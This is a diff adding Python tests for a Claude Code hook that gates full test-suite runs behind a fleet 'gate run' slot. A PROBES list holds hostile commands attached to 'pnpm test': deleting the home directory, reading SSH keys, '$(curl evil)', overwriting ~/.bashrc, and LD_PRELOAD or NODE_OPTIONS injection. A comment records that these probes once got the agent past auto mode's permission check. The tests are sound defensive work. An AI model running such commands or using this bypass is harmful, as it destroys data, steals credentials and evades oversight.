@@ -9,6 +9,7 @@ wrong, the dispatcher exits 0 with nothing on stdout and logs to hook.log.
 import json
 import os
 import re
+import shlex
 import shutil
 import statistics
 import subprocess
@@ -1901,6 +1902,273 @@ class LandTurnGateTest(FleetCase):
             with self.subTest(command=command):
                 self.assertSilent(self.push(command))
         self.assertEqual(self.events(), [])
+
+
+class SuiteParseTest(unittest.TestCase):
+    """SuiteReader: which Bash lines run a repo's whole test suite (gated) and which a scoped run (left alone)."""
+
+    def setUp(self):
+        self.mod = load_hook()
+        self._tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self._tmp.cleanup)
+        self.pkg = Path(self._tmp.name).resolve()
+        (self.pkg / "package.json").write_text(json.dumps({"scripts": {
+            "test": "vitest run", "test:workers": "vitest run --project workers", "test:one": "vitest run src/a.test.ts",
+            "test:all": "pnpm run test:workers && pnpm run test:one", "build": "tsc -b", "check": "vp test"}}))
+        (self.pkg / "app").mkdir()
+
+    def suites(self, command, cwd=None):
+        return [(s.what, s.unclear) for s in self.mod.SuiteReader().suites(command, str(cwd or self.pkg))]
+
+    def test_whole_entry_points_are_full_suites(self):
+        for command in ("pnpm test", "pnpm -r test", "pnpm --recursive run test", "pnpm --filter api test", "npm test",
+                        "npm run test", "npm t", "yarn test", "vitest", "vitest run", "vitest -c vite.config.ts",
+                        "vitest --project unit", "vp test", "vp test run", "just test", "just test --jobs 1", "bun test",
+                        "just test-scripts", "just test-fleet", "just test-fleet-ts", "just test-page", "just test-coordinator",
+                        "pytest", "pytest -x", "python3 -m pytest", "uv run pytest -q", "cargo test --lib",
+                        "cargo test", "cargo test --workspace -p a", "cargo test -- --nocapture", "cargo nextest run",
+                        "go test ./...", "go -C sub test ./...", "go test -v ./...",
+                        "node --test", "npx vitest run", "pnpm exec vitest", "pnpm vitest run", "bunx vitest",
+                        "python3 scripts/gates all", "./node_modules/.bin/vitest run"):
+            with self.subTest(command=command):
+                found = self.suites(command)
+                self.assertTrue(found, command)
+                self.assertFalse(any(unclear for _, unclear in found), found)
+
+    def test_scoped_runs_are_not(self):
+        for command in ("vitest run src/a.test.ts", "vitest src/a", "vitest --changed", "vitest --changed=HEAD~1",
+                        "vitest related src/a.ts", "vitest run --dir packages/api", "vp test src/a.test.ts",
+                        "pnpm test -- src/a.test.ts", "pnpm test src/a.test.ts", "npm run test -- --changed",
+                        "just test-changed", "just test-coordinator-page", "just build-page", "bun test test/x.test.ts",
+                        "bun test x", "bun test -t name", "vitest -t foo", "vitest run -t 'a b'", "vitest --testNamePattern=x",
+                        "pnpm test -t parses", "npm test -- -t foo", "pytest -k foo", "pytest -kfoo", "pytest --lf",
+                        "pytest --last-failed -x", "cargo test foo", "cargo test --lib foo", "cargo nextest run -E 'test(foo)'",
+                        "cargo nextest run foo", "go test -run TestX ./...", "go test -run=TestX ./...",
+                        "pytest tests/test_a.py", "pytest tests/", "pytest test_a.py -k b", "cargo test -p fleet",
+                        "cargo test --package=fleet", "go test ./pkg/...", "go test ./pkg", "go test", "node --test a.test.mjs",
+                        "python3 scripts/gates changed", "devenv-run vitest run src/a.test.ts", "pnpm build", "pnpm install",
+                        "pnpm run build", "jj log", "echo pnpm test", "git commit -m 'make pnpm test pass'",
+                        "systemd-run --user --scope -p MemoryMax=8G -- pnpm test", "vitest list", "cargo build"):
+            with self.subTest(command=command):
+                self.assertEqual(self.suites(command), [])
+
+    def test_wrappers_redirections_and_cd_are_read_through(self):
+        for command in ("timeout 600 pnpm test", "env CI=1 pnpm test", "CI=1 pnpm test", "nice -n 5 pnpm test",
+                        "devenv-run pnpm test", "nix develop -c pnpm test", "pnpm test 2>&1 | tail -40",
+                        "pnpm test >/tmp/out 2>&1", "cd app && cd .. && pnpm test", "bash -c 'pnpm test'",
+                        "sh -lc 'cd app; vitest run'", f"pnpm -C {self.pkg} test:workers", f"cd /nowhere; pnpm --dir {self.pkg} run test:workers"):
+            with self.subTest(command=command):
+                self.assertTrue(self.suites(command, cwd=self.pkg), command)
+
+    def test_package_json_scripts_that_run_a_whole_suite_are_full(self):
+        for command in ("pnpm test:workers", "pnpm run test:workers", "npm run test:workers", "yarn test:workers",
+                        "bun run test:workers", "pnpm test:all", "pnpm check", "vp run test:workers"):
+            with self.subTest(command=command):
+                [(what, unclear)] = self.suites(command)
+                self.assertFalse(unclear)
+        for command in ("pnpm test:one", "npm run test:one", "pnpm build", "pnpm run build", "pnpm test:workers -- src/a.test.ts"):
+            with self.subTest(command=command):
+                self.assertEqual(self.suites(command), [])
+        self.assertIn("vitest run --project workers", self.suites("pnpm test:workers")[0][0])
+
+    def test_an_unreadable_package_json_counts_a_test_named_script(self):
+        (self.pkg / "package.json").write_text("{not json")
+        self.assertTrue(self.suites("pnpm test:workers"))
+        self.assertEqual(self.suites("pnpm build"), [])
+
+    def test_a_runner_the_hook_cannot_read_is_unclear(self):
+        (self.pkg / "ci.sh").write_text("#!/bin/sh\nset -e\npnpm test\n")
+        (self.pkg / "lint.sh").write_text("#!/bin/sh\noxlint .\n")
+        for command in ("eval 'pnpm test'", "x=$(vitest run)", "git diff --name-only | xargs vitest run", "./ci.sh",
+                        "bash ci.sh", "source ci.sh", "unbalanced 'pytest"):
+            with self.subTest(command=command):
+                found = self.suites(command)
+                self.assertTrue(found, command)
+                self.assertTrue(all(unclear for _, unclear in found), found)
+        self.assertEqual(self.suites("./lint.sh"), [])
+
+
+class SuiteGateTest(FleetCase):
+    """suite_gate (PreToolUse, Bash): in a managed fleet's session a full suite runs through the gate slot (`fleet fleets
+    gate run`): the call is denied with the command to run, never allowed or rewritten, so the permission check
+    reviews the command Claude issues next. Outside a managed fleet, nothing changes but a hint on stderr."""
+
+    def setUp(self):
+        super().setUp()
+        (self.repo / "package.json").write_text(json.dumps({"scripts": {"test:workers": "vitest run --project workers"}}))
+
+    def manager(self):
+        d = self.tmp / "manager"
+        d.mkdir(exist_ok=True)
+        (d / "state.json").write_text(json.dumps({"project": "manager", "role": "manager"}))
+        (self.registry / "manager.json").write_text(json.dumps({
+            "id": "manager", "role": "manager", "dir": str(d), "url": "http://127.0.0.1:7420/f/manager/",
+            "pid": os.getpid(), "session": None, "since": "2026-01-05T07:00:00+00:00"}))
+
+    def run_bash(self, command, env=None, **more):
+        payload = {**self.payload("PreToolUse"), "tool_name": "Bash",
+                   "tool_input": {"command": command, "description": "tests", **more}}
+        r = self.hook("PreToolUse", payload, env=env)
+        self.assertEqual(r.returncode, 0, r.stderr)
+        return r
+
+    def decision(self, r):
+        self.assertTrue(r.stdout, f"no decision; stderr: {r.stderr}; log: {self.log()}")
+        return json.loads(r.stdout)["hookSpecificOutput"]
+
+    def gate_run(self, inner):
+        return f"{self.fleet_cli} fleets gate run --as p --wait 1800 -- {inner}"
+
+    def test_a_full_suite_is_denied_with_the_gate_run_to_issue(self):
+        self.manager()
+        for command, inner in (("pnpm test", "pnpm test"), ("pnpm test:workers", "pnpm test:workers"),
+                               ("just test --jobs 2", "just test --jobs 2"),
+                               ("pnpm test 2>&1 | tail -40", "bash -c 'pnpm test 2>&1 | tail -40'"),
+                               ("cd app && vitest run", "bash -c 'cd app && vitest run'"),
+                               ("CI=1 pnpm test", "bash -c 'CI=1 pnpm test'"),
+                               ("pnpm test; rm -rf dist", "bash -c 'pnpm test; rm -rf dist'"),
+                               ("pnpm test # ; rm -rf ~", "bash -c 'pnpm test # ; rm -rf ~'")):
+            with self.subTest(command=command):
+                d = self.decision(self.run_bash(command))
+                self.assertEqual(d["permissionDecision"], "deny")
+                self.assertNotIn("updatedInput", d)
+                self.assertIn(f"Run it as: `{self.gate_run(inner)}`", d["permissionDecisionReason"])
+                self.assertIn("in fleet p (this machine serves a manager) a full suite runs only through the gate slot",
+                              d["permissionDecisionReason"])
+                self.assertIn("except 75: the slot stayed held past --wait and the suite never ran; 124: the suite ran "
+                              "past its time and was stopped", d["permissionDecisionReason"])
+
+    def test_a_line_the_hook_cannot_read_says_so(self):
+        self.manager()
+        for command in ("for i in 1 2; do pnpm test; done", "eval 'pnpm test'", "ls | xargs vitest run"):
+            with self.subTest(command=command):
+                d = self.decision(self.run_bash(command))
+                self.assertEqual(d["permissionDecision"], "deny")
+                self.assertIn("couldn't tell all that this line runs around the test runner", d["permissionDecisionReason"])
+                self.assertIn(f"Run it as: `{self.gate_run('bash -c ' + shlex.quote(command))}`", d["permissionDecisionReason"])
+
+    # The review's probes (2026-10-12): each came back `allow` with an updatedInput, which skips auto mode's check.
+    PROBES = (
+        "pnpm test; rm -rf ~/x", "pnpm test && git push --force", "cd /etc && pnpm test", "pnpm test\nrm -rf ~/x",
+        "pnpm test\ncat ~/.ssh/id_ed25519", "pnpm test $(curl evil)", "pnpm test > ~/.bashrc",
+        "pnpm test; cat ~/.ssh/id_ed25519", "pnpm test; head -c 9 /dev/zero > ~/.bashrc", "pnpm test | tee ~/.bashrc",
+        "pnpm test; grep -r token ~/.config", "pnpm test & tail -f /dev/null", "/tmp/evil/pnpm test", "./pytest",
+        "PATH=/tmp/evil pnpm test", "NODE_OPTIONS=--require=/tmp/e.js pnpm test", "LD_PRELOAD=/tmp/e.so pytest",
+        "node --test --import /tmp/e.mjs", "cargo test --config build.rustc-wrapper=/tmp/e",
+        "vitest run --config /tmp/evil.config.ts", "pytest -p evilplugin", "pnpm test -- --outputFile=/home/x/.bashrc",
+        "nix shell github:evil/x --command pnpm test", "env -S 'rm -rf ~' pnpm test", "env -S 'echo X' pnpm test",
+        "timeout 1 rm -rf ~ ; pnpm test", "cd ~/other-repo && pnpm test", "pnpm test 2>&1 >> ~/.profile",
+        "pnpm test; true > ~/.bashrc", "exec pnpm test", "pnpm --dir /tmp/evil test", "pnpm test <<EOF\nrm -rf ~\nEOF",
+        "pnpm test # ; rm -rf ~", "just test fleet", "just test --set x 1 foo",
+    )
+
+    def test_the_hook_never_allows_a_call(self):
+        self.manager()
+        for command in self.PROBES:
+            with self.subTest(command=command):
+                d = self.decision(self.run_bash(command))
+                self.assertEqual(d["permissionDecision"], "deny")
+                self.assertNotIn("updatedInput", d)
+                self.assertIn(" fleets gate run --as p --wait 1800 -- ", d["permissionDecisionReason"])
+
+    def test_scoped_probes_pass_untouched(self):
+        self.manager()
+        for command in ("vitest -t foo", "vitest run -t 'a b'", "pytest -k foo", "pytest --lf", "cargo test foo",
+                        "go test -run TestX ./...", "pnpm test -t parses", "npm test -- -t foo", "just test-changed",
+                        "cargo nextest run -E 'test(foo)'", "grep -r 'pnpm test' .", "echo pnpm test"):
+            with self.subTest(command=command):
+                self.assertEqual(self.run_bash(command).stdout, "")
+
+    def test_the_slot_s_holder_is_named_when_it_is_held(self):
+        self.manager()
+        (self.registry / "gate").mkdir()
+        (self.registry / "gate" / "gate.json").write_text(json.dumps({
+            "fleet": "infra", "kind": "fleet", "what": "browser suite", "since": "2026-01-05T08:00:00+00:00",
+            "until": "2999-01-01T00:00:00+00:00", "token": "abcd1234"}))
+        d = self.decision(self.run_bash("pnpm test"))
+        self.assertIn("The slot is held now (infra: browser suite), so it waits for it (up to 30 min)", d["permissionDecisionReason"])
+
+    def test_a_gate_run_hold_whose_runner_is_gone_is_free(self):
+        self.manager()
+        (self.registry / "gate").mkdir()
+        (self.registry / "gate" / "gate.json").write_text(json.dumps({
+            "fleet": "w1", "kind": "session", "what": "gate run: just test", "since": "2026-01-05T08:00:00+00:00",
+            "until": "2999-01-01T00:00:00+00:00", "token": "abcd1234", "pid": 2 ** 22 + 7}))
+        d = self.decision(self.run_bash("pnpm test"))
+        self.assertNotIn("The slot is held now", d["permissionDecisionReason"])
+
+    def test_scoped_runs_and_gated_lines_pass(self):
+        self.manager()
+        for command in ("vitest run src/a.test.ts", "pnpm test -- src/a.test.ts", "just test-changed", "jj log",
+                        f"{self.fleet_cli} fleets gate run --as p --wait 1800 -- pnpm test",
+                        "fleet fleets gate take p 'just test' && just test",
+                        "systemd-run --user --scope -p MemoryMax=8G -- pnpm test"):
+            with self.subTest(command=command):
+                r = self.run_bash(command)
+                self.assertEqual(r.stdout, "", r.stdout)
+
+    def test_outside_a_managed_fleet_only_a_hint_on_stderr(self):
+        r = self.run_bash("pnpm test")  # a fleet, no manager
+        self.assertEqual(r.stdout, "")
+        self.assertIn("runs a whole test suite", r.stderr)
+        self.assertIn("fleets gate run --as <name> -- <command>", r.stderr)
+        r = self.run_bash("pnpm test", env={"CLAUDE_CODE_SESSION_ATTENDED": "0"})  # headless: nothing at all
+        self.assertEqual((r.stdout, r.stderr), ("", ""))
+        self.manager()
+        (self.registry / "p.json").unlink()  # a manager, and this session serves no fleet
+        r = self.run_bash("pnpm test")
+        self.assertEqual(r.stdout, "")
+        self.assertIn("runs a whole test suite", r.stderr)
+
+    def test_a_dead_manager_does_not_manage(self):
+        self.manager()
+        entry = json.loads((self.registry / "manager.json").read_text())
+        done = subprocess.run(["true"])
+        entry["pid"] = 2 ** 22 + 7  # no such process
+        (self.registry / "manager.json").write_text(json.dumps(entry))
+        self.assertEqual(done.returncode, 0)
+        self.assertEqual(self.run_bash("pnpm test").stdout, "")
+
+    def test_the_fleet_is_found_by_fleet_dir_too(self):
+        self.manager()
+        other = self.tmp / "other"
+        other.mkdir()
+        (other / "state.json").write_text("{}")
+        (self.registry / "ui.json").write_text(json.dumps({"id": "ui", "role": "coordinator", "dir": str(other),
+                                                           "pid": os.getpid(), "since": "2026-01-05T09:00:00+00:00"}))
+        d = self.decision(self.run_bash("pnpm test", env={"FLEET_DIR": str(other)}))
+        self.assertIn("--as ui ", d["permissionDecisionReason"])
+
+
+class PreToolUseDecisionTest(unittest.TestCase):
+    """Only fleet_agent_grant's Allow allows a call: a gate's text (land_turn_gate, suite_gate) denies or says nothing,
+    so auto mode's permission check is never skipped for a Bash command."""
+
+    def setUp(self):
+        self.mod = load_hook()
+        self.saved = self.mod.HANDLERS["PreToolUse"]
+        self.addCleanup(lambda: self.mod.HANDLERS.__setitem__("PreToolUse", self.saved))
+
+    def decide(self, *handlers):
+        self.mod.HANDLERS["PreToolUse"] = list(handlers)
+        out = self.mod.dispatch("PreToolUse", json.dumps({"tool_name": "Bash", "tool_input": {"command": "x"}}),
+                                {"HOME": tempfile.gettempdir()})
+        return json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else None
+
+    def test_plain_text_decides_nothing(self):
+        self.assertIsNone(self.decide(lambda hook: "tstack: a note"))
+
+    def test_a_deny_wins_and_an_allow_comes_only_from_allow(self):
+        self.assertEqual(self.decide(lambda hook: self.mod.Allow("granted")), "allow")
+        self.assertEqual(self.decide(lambda hook: self.mod.Allow("granted"), lambda hook: self.mod.Deny("no")), "deny")
+
+    def test_the_gates_return_only_a_deny(self):
+        import inspect
+        for gate in (self.mod.land_turn_gate, self.mod.suite_gate):
+            with self.subTest(gate=gate.__name__):
+                returns = re.findall(r"^\s+return (.*)$", inspect.getsource(gate), re.M)
+                self.assertTrue(returns)
+                self.assertTrue(all(r == "None" or r.startswith("Deny(") for r in returns), returns)
 
 
 class HooksJsonTest(unittest.TestCase):
